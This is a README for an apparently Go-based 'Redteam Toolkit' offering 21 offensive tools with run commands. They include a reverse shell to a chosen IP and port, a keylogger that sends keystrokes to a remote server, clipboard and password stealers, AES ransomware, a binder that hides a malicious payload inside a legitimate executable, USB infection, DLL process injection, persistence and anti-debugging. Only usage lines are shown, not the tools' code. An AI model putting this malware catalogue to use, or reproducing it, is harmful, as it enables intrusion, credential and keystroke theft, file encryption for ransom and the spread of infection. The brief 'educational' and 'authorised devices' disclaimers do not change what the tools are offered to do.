# Redteam Toolkit

*WIP*

A collection of red-teaming attacking tools and payloads for Windows and Linux. Some of the scripts will be rougher than others in terms of output etc but I will be actively working on these and improving.

## Tools

### 1. Reverse Shell

A simple reverse shell that connects to a specified IP and port.

#### Usage
```sh
go run reverse_shell/main.go <IP> <PORT>
```

### 2. Keylogger

A simple keylogger for Linux.

#### Usage
```sh
go run keylogger/main.go
```

The keylogger currently supports only Linux.

### 3. Network Scanner

A simple network scanner that scans a given IP range and port range.

#### Usage
```sh
go run network_scanner/main.go <IP_RANGE> <START_PORT> <END_PORT>
```

Example:
```sh
go run network_scanner/main.go 192.168.1.1 20 80
```

### 4. File Downloader

A tool to download files from a specified URL.

#### Usage
```sh
go run file_downloader/main.go <URL> <DEST>
```

Example:
```sh
go run file_downloader/main.go http://example.com/file.txt /tmp/file.txt
```

### 5. Screenshot Capturer

A tool to capture screenshots.

#### Usage
```sh
go run screenshot_capturer/main.go
```

### 6. Clipboard Stealer

A tool to steal the contents of the clipboard.

#### Usage
```sh
go run clipboard_stealer/main.go
```

### 7. Password Stealer

A tool to steal saved passwords (WiFi passwords for Linux).

#### Usage
```sh
go run password_stealer/main.go
```

### 8. Persistence Mechanism

A tool to establish persistence on the target system.

#### Usage
```sh
go run persistence/main.go
```

### 9. Port Forwarder

A tool to forward traffic from one port to another.

#### Usage
```sh
go run port_forwarder/main.go <LOCAL_PORT> <REMOTE_HOST> <REMOTE_PORT>
```

Example:
```sh
go run port_forwarder/main.go 8080 example.com 80
```

### 10. System Info Gatherer

A tool to gather detailed system information.

#### Usage
```sh
go run system_info_gatherer/main.go
```

### 11. Ransomware (Educational Purpose Only)

A tool to encrypt files in a specified directory using AES.

#### Usage
```sh
go run ransomware/main.go <DIRECTORY> <PASSWORD>
```

Example:
```sh
go run ransomware/main.go /path/to/target_directory mypassword
```

### 12. Webcam Capture

A tool to capture images from the webcam.

#### Usage
```sh
go run webcam_capture/main.go
```

### 13. Memory Dumper

Dumps the memory of a specified process.

#### Usage
```sh
go run memory_dumper/main.go <PID>
```

### 14. Stealth File Eraser

Securely deletes files to avoid recovery.

#### Usage
```sh
go run file_eraser/main.go <FILE_PATH>
```

### 15. Process Injection

Injects a DLL into a running process.

#### Usage
```sh
go run process_injection/main.go <PID> <DLL_PATH>
```

### 16. File Binder

Binds a malicious payload to a legitimate executable.

#### Usage
```sh
go run file_binder/main.go <LEGITIMATE_EXE> <MALICIOUS_PAYLOAD> <OUTPUT_EXE>
```

### 17. Keylogger with Network Exfiltration

Sends logged keystrokes to a remote server.

#### Usage
```sh
go run keylogger_network/main.go <SERVER_IP> <SERVER_PORT>
```

### 18. Anti-Debugging

Detects if the tool is being debugged.

#### Usage
```sh
go run anti_debugging/main.go
```

### 19. Network Packet Sniffer

Captures network packets on the local machine.

#### Usage
```sh
go run packet_sniffer/main.go <INTERFACE>
```

### 20. USB Infection

Infects USB drives with a malicious payload.

#### Usage
```sh
go run usb_infection/main.go <PAYLOAD> <DRIVE_LETTER>
```

### 21. System Recon

Collects extensive system information.

#### Usage
```sh
go run system_recon/main.go
```

### Final Step: Update Dependencies

Ensure all dependencies are up to date.

```sh
go get -u ./...
```

## Contributing
All contributions are welcome to improving this collection.

## LICENSE
This work is under MIT License - Only use on authorised devices.